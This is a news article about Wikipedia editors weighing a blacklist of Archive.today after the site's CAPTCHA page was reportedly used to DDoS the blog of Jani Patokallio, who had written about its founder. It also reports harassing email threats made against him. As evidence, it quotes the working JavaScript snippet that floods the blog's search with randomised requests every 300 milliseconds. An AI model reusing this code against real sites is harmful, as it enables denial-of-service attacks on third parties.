---
title: "Archive.today CAPTCHA page executes DDoS; Wikipedia considers banning site"
source: "
                    Jon Brodkin
                "
url: "https://arstechnica.com/tech-policy/2026/02/wikipedia-might-blacklist-archive-today-after-site-maintainer-ddosed-a-blog/"
published: "2026-02-10T19:29:34.000Z"
category: "tech"
summary: "DDoS hit blog that tried to uncover Archive.today founder's identity in 2023."
---
Streisand effect

DDoS hit blog that tried to uncover Archive.today founder’s identity in 2023.

Credit: Getty Images | Riccardo Milani

Wikipedia editors are discussing whether to blacklist Archive.today because the archive site was used to direct a distributed denial of service (DDoS) attack against a blogger who wrote a post in 2023 about the mysterious website’s anonymous maintainer.

In a [request for comment page](https://en.wikipedia.org/wiki/Wikipedia:Requests_for_comment/Archive.is_RFC_5), Wikipedia’s volunteer editors were presented with three options. Option A is to remove or hide all Archive.today links and add the site to the spam blacklist. Option B is to deprecate Archive.today, discouraging future link additions while keeping the existing archived links. Option C is to do nothing and maintain the status quo.

Option A in particular would be a huge change, as more than 695,000 links to Archive.today are used across 400,000 or so Wikipedia pages. Archive.today, also known as Archive.is, is a website that saves snapshots of webpages and is commonly used to bypass news paywalls.

“Archive.today uses advanced scraping methods, and is generally considered more reliable than the Internet Archive,” the Wikipedia request for comment said. “Due to concerns about botnets, linkspamming, and how the site is run, the community [decided to blacklist it](https://en.wikipedia.org/wiki/Wikipedia:Requests_for_comment/Archive.is_RFC) in 2013. In 2016, the decision [was overturned](https://en.wikipedia.org/wiki/Wikipedia:Archive.is_RFC_4), and archive.today was removed from the spam blacklist.”

Discussion among editors has been ongoing since February 7. “Wikipedia’s need for verifiable citations is absolutely _not_ more important than the security of users,” one editor in favor of blacklisting wrote. “We need verifiable citations so that we can maintain readers’ trust, however, in order to be trustworthy our references also have to be safe to access.”

## Archive would be hard to replace

On the other side, an editor who supported Option C wrote that “Archive.today contains a vast amount of archives available nowhere else. Not on Wayback Machine, nowhere. It is the second largest archive provider across all Wikimedia sites. Removal/blockage of this site will be disruptive daily for thousands of editors and readers. It will result in a huge proliferation of {{dead link}} tags that will never be resolved.”

Several posts mentioned an ongoing [FBI case](https://arstechnica.com/tech-policy/2025/11/fbi-subpoena-tries-to-unmask-mysterious-founder-of-archive-today/) that could eventually make the Archive.today links useless anyway. Some said it would be better to act now than to have Option A forced on them later without a backup plan.

One editor supported starting with Option B and eventually shifting to Option A with “the proper end goal being the WMF \[Wikimedia Foundation\] supporting some sort of archive system, whether their own original or directly supporting the Internet Archive’s work so it can be done more systematically.”

Some discussion centered on copyright infringement, given that Archive.today publishes copies of many copyrighted articles. “On the general problem of linking to copyright infringement: perhaps the Wikimedia Foundation can work on ways to establish legally licensed archives of major paywalled sites, in partnership with archives such as the Internet Archive,” one editor wrote. “It would be challenging given the business model of those sites, but maybe a workable compromise can be established that manages how many Wikipedia editors \[have\] access at a given time.”

## Malicious code in CAPTCHA page

The DDoS attack being discussed by Wikipedia editors was targeted at the [Gyrovague blog](https://gyrovague.com/) written by Jani Patokallio. Last month, “the maintainers of Archive.today injected malicious code in order to perform a distributed denial of service attack against a person they were in dispute with,” the Wikipedia request for comment says. “Every time a user encounters the CAPTCHA page, their Internet connection is used to attack a certain individual’s blog.”

The trustworthiness of Archive.today was discussed in light of evidence that the site’s founder threatened to create “a new category of AI porn” in retaliation against the blogger. The AI porn threat was mentioned by several editors.

“I echo others \[that Option\] A is looking like something we’ll have to do eventually, anyways, and at least this way we have a chance to do it on our terms,” one editor wrote. “I hate to break it to you, but even if the FBI thing goes nowhere, a website whose operator apparently threatens to create AI porn in retaliation against enemies, using their names, isn’t a trustworthy mirror, and isn’t going to remain one.”

One editor reported being “miserable” about supporting Option A, “but we cannot permit websites to rope our readers into being part of DDoS attacks.” Moreover, “The fact is that most of the archive.today links on Wikipedia are not an attempt to save URLs that have now gone dead that the Internet Archive cannot handle, but efforts to bypass paywalls, which is convenient, but illegal. It’s strange that we accept links to archive.today for this purpose but don’t accept the same for Anna’s Archive or Sci-Hub,” the editor wrote.

We emailed the Archive.today’s webmaster address today about the Wikipedia discussion and will update this article if we get a response.

## Blogger tried to uncover founder’s identity

The Wikipedia request for comments acknowledged that whether to blacklist would be a difficult decision. There are “significant concerns for readers’ safety, as well as the long-term stability and integrity of the service,” but “a significant amount of people also think that mass-removing links to Archive.today may harm verifiability, and that the service is harder to censor than certain other archiving sites,” it said.

An update to the request for comments yesterday indicated that the attack temporarily stopped, but the malicious code had been reactivated. “Please do not visit the archive without blocking network requests to gyrovague.com to avoid being part of the attack!” it said.

The code’s first public mention was apparently in a [Hacker News thread](https://news.ycombinator.com/item?id=46624740) on January 14, and Patokallio wrote about the DDoS in a [February 1 blog post](https://gyrovague.com/2026/02/01/archive-today-is-directing-a-ddos-attack-against-my-blog/). “Every 300 milliseconds, as long as the CAPTCHA page is open, this makes a request to the search function of my blog using a random string, ensuring the response cannot be cached and thus consumes resources,” he wrote. The Javascript code in the Archive.today CAPTCHA page is as follows:

```
        setInterval(function() {
            fetch("https://gyrovague.com/?s=" + Math.random().toString(36).substring(2, 3 + Math.random() * 8), {
                referrerPolicy: "no-referrer",
                mode: "no-cors"
            });
        }, 300);
```

In August 2023, Patokallio wrote a [post](https://gyrovague.com/2023/08/05/archive-today-on-the-trail-of-the-mysterious-guerrilla-archivist-of-the-internet/) attempting to uncover the identity of Archive.today founder “Denis Petrov,” which seems to be an alias. Patokallio wasn’t able to figure out who the founder is but cobbled together various tidbits from Internet searches, including a Stack Exchange post that mentioned another potential alias, “Masha Rabinovich.”

Patokallio seemed to be driven by curiosity and was impressed by Archive.today’s work. “It’s a testament to their persistence that they’re managed to keep this up for over 10 years, and I for one will be buying Denis/Masha/whoever a well deserved cup of coffee,” Patokallio’s 2023 post said.

The Gyrovague blog’s sidebar states that Patokallio works for Google’s Cloud team in Sydney, Australia. In his post this month, Patokallio said his 2023 blog “gathered some 10,000 views and [a bit \[of\] discussion on Hacker News,](https://news.ycombinator.com/item?id=37009598) but didn’t exactly set the blogosphere on fire. And indeed, absolutely nothing happened for the next two years and a bit.”

## FBI case revives interest in 2023 blog

But in October 2025, the FBI sent a [subpoena](https://web.archive.org/web/20251102062750/https://pdflink.to/1e0e0ecd/) to domain registrar Tucows seeking “subscriber information on \[the\] customer behind archive.today” in connection with “a federal criminal investigation being conducted by the FBI.” We [wrote about](https://arstechnica.com/tech-policy/2025/11/fbi-subpoena-tries-to-unmask-mysterious-founder-of-archive-today/) the subpoena, and our story included a link to Patokallio’s 2023 blog post in a sentence that said, “There are several indications that the \[Archive.today\] founder is from Russia.”

In an email to Ars, Patokallio told us that the DDoS attack “appears to be because you kindly mentioned my blog in your Nov 8, 2025 story.” Patokallio added that he is “as mystified by this as you probably are.” Articles about the subpoena by [The Verge](https://www.theverge.com/news/815691/fbi-subpoena-archive-is-owner) and [Heise Online](https://www.heise.de/en/news/Archive-today-FBI-Demands-Data-from-Provider-Tucows-11066346.html) also linked to Patokallio’s 2023 blog post.

On January 8, 2026, Patokallio’s hosting company, Automattic, notified him that it received a GDPR \[[General Data Protection Regulation](https://en.wikipedia.org/wiki/General_Data_Protection_Regulation)\] complaint from a “Nora Puchreiner” alleging that the 2023 post “contains extensive personal data… presented in a narrative that is defamatory in tone and context.” Patokallio said that after he submitted a rebuttal, “Automattic sided with me and left the post up.”

Patokallio said he also “received a politely worded email from archive.today’s webmaster asking me to take down the post for a few months” on January 10. The email was classified as spam by Gmail, and he didn’t see it until five days later, he said. In the meantime, the DDoS started.

Patokallio said he replied to the webmaster’s email on January 15 and again on January 20 but didn’t hear back. He tried a third time on January 25, saying he would not take down the blog post but offered to “change some wording that you feel is being misrepresented.”

## Emails threatened AI porn and other scams

Patokallio posted what he called a lightly redacted copy of the resulting [email thread](https://pastes.io/correspond). The first email from the Archive.today webmaster said, “I do not mind the post, but the issue is: journos from mainstream media (Heise, Verge, etc) cherry-pick just a couple of words from your blog, and then construct very different narratives having your post the only citable source; then they cite each other and produce a shitty result to present for a wide audience.”

In a later email, “Nora Puchreiner” wrote, “I do not care on your blog and its content. I just need the links from Heise and other media to be 404.” One message threatened to investigate “your Nazi grandfather” and “vibecode a gyrovague.gay dating app.” Another threatened to create a public association between Patokallio’s name and AI porn.

A Tumblr [blog post](https://archive-is.tumblr.com/post/807369905134518272/the-finne-troll-published-his-response-with) apparently written by the Archive.today founder seems to generally confirm the emails’ veracity, but says the original version threatened to create “a patokallio.gay dating app,” not “a gyrovague.gay dating app.” The Tumblr blog has several other recent posts criticizing Patokallio and accusing him of hiding his real name. However, the Gyrovague blog shows Patokallio’s name in a sidebar and discloses that he works for Google, while stating that the blog posts contain only his personal views.

In one email, Patokallio included a link to Wikipedia’s page on the [Streisand effect](https://en.wikipedia.org/wiki/Streisand_effect), a name for situations in which people seeking to suppress access to information instead draw more public attention to the information they want hidden. The Archive.today site maintainer apparently viewed this as a threat.

“And threatening me with Streisand… having such a noble and rare name, which in retaliation could be used for the name of a scam project or become a byword for a new category of AI porn… are you serious?” the email said. Patokallio responded, “No, you’re Streisanding yourself: the DDOS has _already_ drawn more attention to my blog post than it had gotten in the last two years, with zero action on my side.”

A subsequent reply in the email thread contained the “Nazi grandfather” and “gay dating app” threats. Patokallio wrote that after these emails, it didn’t seem worthwhile to continue the discussion. “At this point it was pretty clear the conversation had run its course, so here we are,” Patokallio wrote in his February 1 blog post. “And for the record, my long-dead grandfather served in an anti-aircraft unit of the [Finnish Army during WW2](https://en.wikipedia.org/wiki/Finland_in_World_War_II), defending against the attacks of the Soviet Union. Perhaps this is enough to qualify as a ‘Nazi’ in Russia these days.”

While the outcome at Wikipedia is not yet settled, Patokallio wrote that the DDoS attack didn’t cause him any real harm. The Archive.today maintainer apparently [intended](https://infosec.exchange/@iampytest1/115905846553756281) to make Patokallio’s hosting costs more expensive, but “I have a flat fee plan, meaning this has cost me exactly zero dollars,” he wrote.

[![Photo of Jon Brodkin](https://cdn.arstechnica.net/wp-content/uploads/2016/05/j.brodkin-11_2.jpg)](https://arstechnica.com/author/jon-brodkin/)

Jon is a Senior IT Reporter for Ars Technica. He covers the telecom industry, Federal Communications Commission rulemakings, broadband consumer affairs, court cases, and government regulation of the tech industry.

[9 Comments](https://arstechnica.com/tech-policy/2026/02/wikipedia-might-blacklist-archive-today-after-site-maintainer-ddosed-a-blog/#comments "9 comments")

1.  [![Listing image for first story in Most Read: Discord faces backlash over age checks after data breach exposed 70,000 IDs](https://cdn.arstechnica.net/wp-content/uploads/2026/02/GettyImages-2225503659-768x432.jpg)](https://arstechnica.com/tech-policy/2026/02/discord-faces-backlash-over-age-checks-after-data-breach-exposed-70000-ids/)
